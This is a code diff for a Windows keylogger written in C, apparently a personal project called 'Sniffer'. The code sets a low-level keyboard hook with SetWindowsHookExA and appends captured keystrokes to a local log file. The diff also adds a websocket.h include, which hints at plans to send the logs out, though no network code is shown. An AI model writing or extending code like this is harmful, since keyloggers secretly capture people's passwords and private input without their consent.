@@ -1,10 +1,12 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <windows.h>
-#include <assert.h>
+#include <websocket.h>
 
 HHOOK keyboardHook;
 HANDLE filehandle;
+DWORD dwBytesWritten;
+char *filename = "C:\\Users\\amitz\\source\\repos\\Sniffer\\log.txt";
 int writeKeyToFile(PKBDLLHOOKSTRUCT key);
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
@@ -22,8 +24,6 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 int main() {
     
     keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, NULL);
-    //int pid = GetWindowThreadProcessId(hwnd, 0);
-    //printf("%d\n", pid);
     MSG msg = { 0 };
     while (GetMessage(&msg, NULL, 0, 0) != 0);
     UnhookWindowsHookEx(keyboardHook);
@@ -32,8 +32,6 @@ int main() {
 
 int writeKeyToFile(PKBDLLHOOKSTRUCT key)
 {
-    DWORD dwBytesWritten;
-    char *filename = "C:\\Users\\amitz\\source\\repos\\Sniffer\\log.txt";
     filehandle = CreateFileA(TEXT(filename), FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (filehandle == INVALID_HANDLE_VALUE) {
         printf("\nCould not open %s.\n", filename);
